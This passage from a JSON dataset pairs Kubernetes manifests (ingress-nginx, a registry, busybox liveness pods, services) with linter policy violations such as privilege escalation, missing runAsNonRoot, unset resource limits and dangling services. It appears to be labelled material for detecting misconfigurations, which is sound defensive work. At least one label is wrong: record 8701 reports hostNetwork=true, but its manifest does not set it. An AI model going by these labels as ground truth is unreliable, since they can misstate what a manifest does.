    securityContext:\n          allowPrivilegeEscalation: true\n          capabilities:\n            add:\n            - NET_BIND_SERVICE\n            drop:\n            - ALL\n          runAsUser: 33\n      serviceAccountName: nginx-ingress-serviceaccount\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"nginx-ingress-serviceaccount\" not found"
  },
  {
    "id": "8693",
    "manifest_path": "data/manifests/the_stack_sample/sample_3266.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: ingress-nginx\n    app.kubernetes.io/part-of: ingress-nginx\n  name: nginx-ingress-controller\n  namespace: ingress-nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: ingress-nginx\n      app.kubernetes.io/part-of: ingress-nginx\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '10254'\n        prometheus.io/scrape: 'true'\n      labels:\n        app.kubernetes.io/name: ingress-nginx\n        app.kubernetes.io/part-of: ingress-nginx\n    spec:\n      containers:\n      - args:\n        - /nginx-ingress-controller\n        - --configmap=$(POD_NAMESPACE)/nginx-configuration\n        - --tcp-services-configmap=$(POD_NAMESPACE)/tcp-services\n        - --udp-services-configmap=$(POD_NAMESPACE)/udp-services\n        - --publish-service=$(POD_NAMESPACE)/ingress-nginx\n        - --annotations-prefix=nginx.ingress.kubernetes.io\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: quay.io/kubernetes-ingress-controller/nginx-ingress-controller:0.22.0\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        name: nginx-ingress-controller\n        ports:\n        - containerPort: 80\n          name: http\n        - containerPort: 443\n          name: https\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        securityContext:\n          allowPrivilegeEscalation: true\n          capabilities:\n            add:\n            - NET_BIND_SERVICE\n            drop:\n            - ALL\n          runAsUser: 33\n      serviceAccountName: nginx-ingress-serviceaccount\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"nginx-ingress-controller\" has AllowPrivilegeEscalation set to true."
  },
  {
    "id": "8694",
    "manifest_path": "data/manifests/the_stack_sample/sample_3266.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: ingress-nginx\n    app.kubernetes.io/part-of: ingress-nginx\n  name: nginx-ingress-controller\n  namespace: ingress-nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: ingress-nginx\n      app.kubernetes.io/part-of: ingress-nginx\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '10254'\n        prometheus.io/scrape: 'true'\n      labels:\n        app.kubernetes.io/name: ingress-nginx\n        app.kubernetes.io/part-of: ingress-nginx\n    spec:\n      containers:\n      - args:\n        - /nginx-ingress-controller\n        - --configmap=$(POD_NAMESPACE)/nginx-configuration\n        - --tcp-services-configmap=$(POD_NAMESPACE)/tcp-services\n        - --udp-services-configmap=$(POD_NAMESPACE)/udp-services\n        - --publish-service=$(POD_NAMESPACE)/ingress-nginx\n        - --annotations-prefix=nginx.ingress.kubernetes.io\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: quay.io/kubernetes-ingress-controller/nginx-ingress-controller:0.22.0\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        name: nginx-ingress-controller\n        ports:\n        - containerPort: 80\n          name: http\n        - containerPort: 443\n          name: https\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        securityContext:\n          allowPrivilegeEscalation: true\n          capabilities:\n            add:\n            - NET_BIND_SERVICE\n            drop:\n            - ALL\n          runAsUser: 33\n      serviceAccountName: nginx-ingress-serviceaccount\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"nginx-ingress-controller\" does not expose port 10254 for the HTTPGet"
  },
  {
    "id": "8695",
    "manifest_path": "data/manifests/the_stack_sample/sample_3266.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: ingress-nginx\n    app.kubernetes.io/part-of: ingress-nginx\n  name: nginx-ingress-controller\n  namespace: ingress-nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: ingress-nginx\n      app.kubernetes.io/part-of: ingress-nginx\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '10254'\n        prometheus.io/scrape: 'true'\n      labels:\n        app.kubernetes.io/name: ingress-nginx\n        app.kubernetes.io/part-of: ingress-nginx\n    spec:\n      containers:\n      - args:\n        - /nginx-ingress-controller\n        - --configmap=$(POD_NAMESPACE)/nginx-configuration\n        - --tcp-services-configmap=$(POD_NAMESPACE)/tcp-services\n        - --udp-services-configmap=$(POD_NAMESPACE)/udp-services\n        - --publish-service=$(POD_NAMESPACE)/ingress-nginx\n        - --annotations-prefix=nginx.ingress.kubernetes.io\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: quay.io/kubernetes-ingress-controller/nginx-ingress-controller:0.22.0\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        name: nginx-ingress-controller\n        ports:\n        - containerPort: 80\n          name: http\n        - containerPort: 443\n          name: https\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        securityContext:\n          allowPrivilegeEscalation: true\n          capabilities:\n            add:\n            - NET_BIND_SERVICE\n            drop:\n            - ALL\n          runAsUser: 33\n      serviceAccountName: nginx-ingress-serviceaccount\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx-ingress-controller\" has cpu request 0"
  },
  {
    "id": "8696",
    "manifest_path": "data/manifests/the_stack_sample/sample_3266.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: ingress-nginx\n    app.kubernetes.io/part-of: ingress-nginx\n  name: nginx-ingress-controller\n  namespace: ingress-nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: ingress-nginx\n      app.kubernetes.io/part-of: ingress-nginx\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '10254'\n        prometheus.io/scrape: 'true'\n      labels:\n        app.kubernetes.io/name: ingress-nginx\n        app.kubernetes.io/part-of: ingress-nginx\n    spec:\n      containers:\n      - args:\n        - /nginx-ingress-controller\n        - --configmap=$(POD_NAMESPACE)/nginx-configuration\n        - --tcp-services-configmap=$(POD_NAMESPACE)/tcp-services\n        - --udp-services-configmap=$(POD_NAMESPACE)/udp-services\n        - --publish-service=$(POD_NAMESPACE)/ingress-nginx\n        - --annotations-prefix=nginx.ingress.kubernetes.io\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: quay.io/kubernetes-ingress-controller/nginx-ingress-controller:0.22.0\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        name: nginx-ingress-controller\n        ports:\n        - containerPort: 80\n          name: http\n        - containerPort: 443\n          name: https\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        securityContext:\n          allowPrivilegeEscalation: true\n          capabilities:\n            add:\n            - NET_BIND_SERVICE\n            drop:\n            - ALL\n          runAsUser: 33\n      serviceAccountName: nginx-ingress-serviceaccount\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx-ingress-controller\" has memory limit 0"
  },
  {
    "id": "8697",
    "manifest_path": "data/manifests/the_stack_sample/sample_3268.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: osie-bootloader\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      tinkerbell/component: osie-bootloader\n  template:\n    metadata:\n      labels:\n        tinkerbell/component: osie-bootloader\n    spec:\n      containers:\n      - image: nginx:alpine\n        name: osie-bootloader\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - mountPath: /usr/share/nginx/html/\n          name: webroot\n      volumes:\n      - name: webroot\n        hostPath:\n          path: /abhnvp/sandbox/deploy/compose/state/webroot\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"osie-bootloader\" does not have a read-only root file system"
  },
  {
    "id": "8698",
    "manifest_path": "data/manifests/the_stack_sample/sample_3268.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: osie-bootloader\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      tinkerbell/component: osie-bootloader\n  template:\n    metadata:\n      labels:\n        tinkerbell/component: osie-bootloader\n    spec:\n      containers:\n      - image: nginx:alpine\n        name: osie-bootloader\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - mountPath: /usr/share/nginx/html/\n          name: webroot\n      volumes:\n      - name: webroot\n        hostPath:\n          path: /abhnvp/sandbox/deploy/compose/state/webroot\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"osie-bootloader\" is not set to runAsNonRoot"
  },
  {
    "id": "8699",
    "manifest_path": "data/manifests/the_stack_sample/sample_3268.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: osie-bootloader\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      tinkerbell/component: osie-bootloader\n  template:\n    metadata:\n      labels:\n        tinkerbell/component: osie-bootloader\n    spec:\n      containers:\n      - image: nginx:alpine\n        name: osie-bootloader\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - mountPath: /usr/share/nginx/html/\n          name: webroot\n      volumes:\n      - name: webroot\n        hostPath:\n          path: /abhnvp/sandbox/deploy/compose/state/webroot\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"osie-bootloader\" has cpu request 0"
  },
  {
    "id": "8700",
    "manifest_path": "data/manifests/the_stack_sample/sample_3268.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: osie-bootloader\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      tinkerbell/component: osie-bootloader\n  template:\n    metadata:\n      labels:\n        tinkerbell/component: osie-bootloader\n    spec:\n      containers:\n      - image: nginx:alpine\n        name: osie-bootloader\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - mountPath: /usr/share/nginx/html/\n          name: webroot\n      volumes:\n      - name: webroot\n        hostPath:\n          path: /abhnvp/sandbox/deploy/compose/state/webroot\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"osie-bootloader\" has memory limit 0"
  },
  {
    "id": "8701",
    "manifest_path": "data/manifests/the_stack_sample/sample_3270.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: registry-deploymenti\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: registry\n  template:\n    metadata:\n      labels:\n        app: registry\n      annotations:\n        egress-bandwidth: 10Mbit\n    spec:\n      containers:\n      - image: registry:2.7.1\n        name: registry-container\n        ports:\n        - containerPort: 443\n        volumeMounts:\n        - name: registry\n          mountPath: /var/lib/registry\n        - name: config\n          mountPath: /etc/docker/registry/config.yml\n        - name: certs\n          mountPath: /certs\n        env:\n        - name: REGISTRY_HTTP_ADDR\n          value: 0.0.0.0:443\n        - name: REGISTRY_HTTP_TLS_CERTIFICATE\n          value: /certs/registry.crt\n        - name: REGISTRY_HTTP_TLS_KEY\n          value: /certs/registry.key\n      volumes:\n      - name: registry\n        hostPath:\n          path: /var/lib/registry\n      - name: config\n        hostPath:\n          path: /etc/docker/registry/config.yml\n      - name: certs\n        hostPath:\n          path: /etc/docker/registry/certs\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "8702",
    "manifest_path": "data/manifests/the_stack_sample/sample_3270.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: registry-deploymenti\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: registry\n  template:\n    metadata:\n      labels:\n        app: registry\n      annotations:\n        egress-bandwidth: 10Mbit\n    spec:\n      containers:\n      - image: registry:2.7.1\n        name: registry-container\n        ports:\n        - containerPort: 443\n        volumeMounts:\n        - name: registry\n          mountPath: /var/lib/registry\n        - name: config\n          mountPath: /etc/docker/registry/config.yml\n        - name: certs\n          mountPath: /certs\n        env:\n        - name: REGISTRY_HTTP_ADDR\n          value: 0.0.0.0:443\n        - name: REGISTRY_HTTP_TLS_CERTIFICATE\n          value: /certs/registry.crt\n        - name: REGISTRY_HTTP_TLS_KEY\n          value: /certs/registry.key\n      volumes:\n      - name: registry\n        hostPath:\n          path: /var/lib/registry\n      - name: config\n        hostPath:\n          path: /etc/docker/registry/config.yml\n      - name: certs\n        hostPath:\n          path: /etc/docker/registry/certs\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"registry-container\" does not have a read-only root file system"
  },
  {
    "id": "8703",
    "manifest_path": "data/manifests/the_stack_sample/sample_3270.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: registry-deploymenti\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: registry\n  template:\n    metadata:\n      labels:\n        app: registry\n      annotations:\n        egress-bandwidth: 10Mbit\n    spec:\n      containers:\n      - image: registry:2.7.1\n        name: registry-container\n        ports:\n        - containerPort: 443\n        volumeMounts:\n        - name: registry\n          mountPath: /var/lib/registry\n        - name: config\n          mountPath: /etc/docker/registry/config.yml\n        - name: certs\n          mountPath: /certs\n        env:\n        - name: REGISTRY_HTTP_ADDR\n          value: 0.0.0.0:443\n        - name: REGISTRY_HTTP_TLS_CERTIFICATE\n          value: /certs/registry.crt\n        - name: REGISTRY_HTTP_TLS_KEY\n          value: /certs/registry.key\n      volumes:\n      - name: registry\n        hostPath:\n          path: /var/lib/registry\n      - name: config\n        hostPath:\n          path: /etc/docker/registry/config.yml\n      - name: certs\n        hostPath:\n          path: /etc/docker/registry/certs\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"registry-container\" is not set to runAsNonRoot"
  },
  {
    "id": "8704",
    "manifest_path": "data/manifests/the_stack_sample/sample_3270.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: registry-deploymenti\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: registry\n  template:\n    metadata:\n      labels:\n        app: registry\n      annotations:\n        egress-bandwidth: 10Mbit\n    spec:\n      containers:\n      - image: registry:2.7.1\n        name: registry-container\n        ports:\n        - containerPort: 443\n        volumeMounts:\n        - name: registry\n          mountPath: /var/lib/registry\n        - name: config\n          mountPath: /etc/docker/registry/config.yml\n        - name: certs\n          mountPath: /certs\n        env:\n        - name: REGISTRY_HTTP_ADDR\n          value: 0.0.0.0:443\n        - name: REGISTRY_HTTP_TLS_CERTIFICATE\n          value: /certs/registry.crt\n        - name: REGISTRY_HTTP_TLS_KEY\n          value: /certs/registry.key\n      volumes:\n      - name: registry\n        hostPath:\n          path: /var/lib/registry\n      - name: config\n        hostPath:\n          path: /etc/docker/registry/config.yml\n      - name: certs\n        hostPath:\n          path: /etc/docker/registry/certs\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"registry-container\" has cpu request 0"
  },
  {
    "id": "8705",
    "manifest_path": "data/manifests/the_stack_sample/sample_3270.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: registry-deploymenti\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: registry\n  template:\n    metadata:\n      labels:\n        app: registry\n      annotations:\n        egress-bandwidth: 10Mbit\n    spec:\n      containers:\n      - image: registry:2.7.1\n        name: registry-container\n        ports:\n        - containerPort: 443\n        volumeMounts:\n        - name: registry\n          mountPath: /var/lib/registry\n        - name: config\n          mountPath: /etc/docker/registry/config.yml\n        - name: certs\n          mountPath: /certs\n        env:\n        - name: REGISTRY_HTTP_ADDR\n          value: 0.0.0.0:443\n        - name: REGISTRY_HTTP_TLS_CERTIFICATE\n          value: /certs/registry.crt\n        - name: REGISTRY_HTTP_TLS_KEY\n          value: /certs/registry.key\n      volumes:\n      - name: registry\n        hostPath:\n          path: /var/lib/registry\n      - name: config\n        hostPath:\n          path: /etc/docker/registry/config.yml\n      - name: certs\n        hostPath:\n          path: /etc/docker/registry/certs\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"registry-container\" has memory limit 0"
  },
  {
    "id": "8706",
    "manifest_path": "data/manifests/the_stack_sample/sample_3271.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    test: liveness\n  name: liveness-exec\nspec:\n  containers:\n  - name: liveness\n    image: gcr.io/google_containers/busybox\n    args:\n    - /bin/sh\n    - -c\n    - echo ok > /tmp/health; sleep 10; rm -rf /tmp/health; sleep 600\n    livenessProbe:\n      exec:\n        command:\n        - cat\n        - /tmp/health\n      initialDelaySeconds: 8\n      timeoutSeconds: 1\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"liveness\" is using an invalid container image, \"gcr.io/google_containers/busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8707",
    "manifest_path": "data/manifests/the_stack_sample/sample_3271.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    test: liveness\n  name: liveness-exec\nspec:\n  containers:\n  - name: liveness\n    image: gcr.io/google_containers/busybox\n    args:\n    - /bin/sh\n    - -c\n    - echo ok > /tmp/health; sleep 10; rm -rf /tmp/health; sleep 600\n    livenessProbe:\n      exec:\n        command:\n        - cat\n        - /tmp/health\n      initialDelaySeconds: 8\n      timeoutSeconds: 1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"liveness\" does not have a read-only root file system"
  },
  {
    "id": "8708",
    "manifest_path": "data/manifests/the_stack_sample/sample_3271.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    test: liveness\n  name: liveness-exec\nspec:\n  containers:\n  - name: liveness\n    image: gcr.io/google_containers/busybox\n    args:\n    - /bin/sh\n    - -c\n    - echo ok > /tmp/health; sleep 10; rm -rf /tmp/health; sleep 600\n    livenessProbe:\n      exec:\n        command:\n        - cat\n        - /tmp/health\n      initialDelaySeconds: 8\n      timeoutSeconds: 1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"liveness\" is not set to runAsNonRoot"
  },
  {
    "id": "8709",
    "manifest_path": "data/manifests/the_stack_sample/sample_3271.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    test: liveness\n  name: liveness-exec\nspec:\n  containers:\n  - name: liveness\n    image: gcr.io/google_containers/busybox\n    args:\n    - /bin/sh\n    - -c\n    - echo ok > /tmp/health; sleep 10; rm -rf /tmp/health; sleep 600\n    livenessProbe:\n      exec:\n        command:\n        - cat\n        - /tmp/health\n      initialDelaySeconds: 8\n      timeoutSeconds: 1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"liveness\" has cpu request 0"
  },
  {
    "id": "8710",
    "manifest_path": "data/manifests/the_stack_sample/sample_3271.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    test: liveness\n  name: liveness-exec\nspec:\n  containers:\n  - name: liveness\n    image: gcr.io/google_containers/busybox\n    args:\n    - /bin/sh\n    - -c\n    - echo ok > /tmp/health; sleep 10; rm -rf /tmp/health; sleep 600\n    livenessProbe:\n      exec:\n        command:\n        - cat\n        - /tmp/health\n      initialDelaySeconds: 8\n      timeoutSeconds: 1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"liveness\" has memory limit 0"
  },
  {
    "id": "8711",
    "manifest_path": "data/manifests/the_stack_sample/sample_3272.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ham-application-assembler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: ham-application-assembler\n  template:\n    metadata:\n      labels:\n        name: ham-application-assembler\n    spec:\n      serviceAccountName: ham-application-assembler\n      containers:\n      - name: ham-application-assembler\n        image: REPLACE_IMAGE\n        command:\n        - ham-application-assembler\n        args:\n        - -v=3\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: ham-application-assembler\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"ham-application-assembler\" is using an invalid container image, \"REPLACE_IMAGE\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8712",
    "manifest_path": "data/manifests/the_stack_sample/sample_3272.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ham-application-assembler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: ham-application-assembler\n  template:\n    metadata:\n      labels:\n        name: ham-application-assembler\n    spec:\n      serviceAccountName: ham-application-assembler\n      containers:\n      - name: ham-application-assembler\n        image: REPLACE_IMAGE\n        command:\n        - ham-application-assembler\n        args:\n        - -v=3\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: ham-application-assembler\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ham-application-assembler\" does not have a read-only root file system"
  },
  {
    "id": "8713",
    "manifest_path": "data/manifests/the_stack_sample/sample_3272.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ham-application-assembler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: ham-application-assembler\n  template:\n    metadata:\n      labels:\n        name: ham-application-assembler\n    spec:\n      serviceAccountName: ham-application-assembler\n      containers:\n      - name: ham-application-assembler\n        image: REPLACE_IMAGE\n        command:\n        - ham-application-assembler\n        args:\n        - -v=3\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: ham-application-assembler\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"ham-application-assembler\" not found"
  },
  {
    "id": "8714",
    "manifest_path": "data/manifests/the_stack_sample/sample_3272.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ham-application-assembler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: ham-application-assembler\n  template:\n    metadata:\n      labels:\n        name: ham-application-assembler\n    spec:\n      serviceAccountName: ham-application-assembler\n      containers:\n      - name: ham-application-assembler\n        image: REPLACE_IMAGE\n        command:\n        - ham-application-assembler\n        args:\n        - -v=3\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: ham-application-assembler\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ham-application-assembler\" is not set to runAsNonRoot"
  },
  {
    "id": "8715",
    "manifest_path": "data/manifests/the_stack_sample/sample_3272.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ham-application-assembler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: ham-application-assembler\n  template:\n    metadata:\n      labels:\n        name: ham-application-assembler\n    spec:\n      serviceAccountName: ham-application-assembler\n      containers:\n      - name: ham-application-assembler\n        image: REPLACE_IMAGE\n        command:\n        - ham-application-assembler\n        args:\n        - -v=3\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: ham-application-assembler\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ham-application-assembler\" has cpu request 0"
  },
  {
    "id": "8716",
    "manifest_path": "data/manifests/the_stack_sample/sample_3272.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ham-application-assembler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: ham-application-assembler\n  template:\n    metadata:\n      labels:\n        name: ham-application-assembler\n    spec:\n      serviceAccountName: ham-application-assembler\n      containers:\n      - name: ham-application-assembler\n        image: REPLACE_IMAGE\n        command:\n        - ham-application-assembler\n        args:\n        - -v=3\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: ham-application-assembler\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ham-application-assembler\" has memory limit 0"
  },
  {
    "id": "8717",
    "manifest_path": "data/manifests/the_stack_sample/sample_3273.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    name: bearer-ruby\nspec:\n  containers:\n  - name: ruby261\n    image: ruby:2.6.1-alpine\n    command:\n    - cat\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ruby261\" does not have a read-only root file system"
  },
  {
    "id": "8718",
    "manifest_path": "data/manifests/the_stack_sample/sample_3273.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    name: bearer-ruby\nspec:\n  containers:\n  - name: ruby261\n    image: ruby:2.6.1-alpine\n    command:\n    - cat\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ruby261\" is not set to runAsNonRoot"
  },
  {
    "id": "8719",
    "manifest_path": "data/manifests/the_stack_sample/sample_3273.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    name: bearer-ruby\nspec:\n  containers:\n  - name: ruby261\n    image: ruby:2.6.1-alpine\n    command:\n    - cat\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ruby261\" has cpu request 0"
  },
  {
    "id": "8720",
    "manifest_path": "data/manifests/the_stack_sample/sample_3273.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    name: bearer-ruby\nspec:\n  containers:\n  - name: ruby261\n    image: ruby:2.6.1-alpine\n    command:\n    - cat\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ruby261\" has memory limit 0"
  },
  {
    "id": "8721",
    "manifest_path": "data/manifests/the_stack_sample/sample_3274.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: injector\n  annotations:\n    cert.injector.ko/issue: 'true'\n    cert.injector.ko/ca-url: https://acme-v02.api.letsencrypt.org/directory\n    cert.injector.ko/domains: example.domain.com\n    cert.injector.ko/email: your@email.com\n    cert.injector.ko/auto-inject: 'true'\nspec:\n  type: LoadBalancer\n  ports:\n  - name: http\n    port: 80\n    targetPort: http\n  selector:\n    app: nginx\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:nginx])"
  },
  {
    "id": "8722",
    "manifest_path": "data/manifests/the_stack_sample/sample_3278.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: redis\n  namespace: chp17-set175\nspec:\n  ports:\n  - port: 6379\n    name: peer\n  clusterIP: None\n  selector:\n    app: redis\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:redis])"
  },
  {
    "id": "8723",
    "manifest_path": "data/manifests/the_stack_sample/sample_3283.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: contour\n  namespace: contour-external\n  labels:\n    networking.knative.dev/ingress-provider: contour\nspec:\n  type: ClusterIP\n  selector:\n    app: contour\n  ports:\n  - name: xds\n    protocol: TCP\n    port: 8001\n    targetPort: 8001\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:contour])"
  },
  {
    "id": "8724",
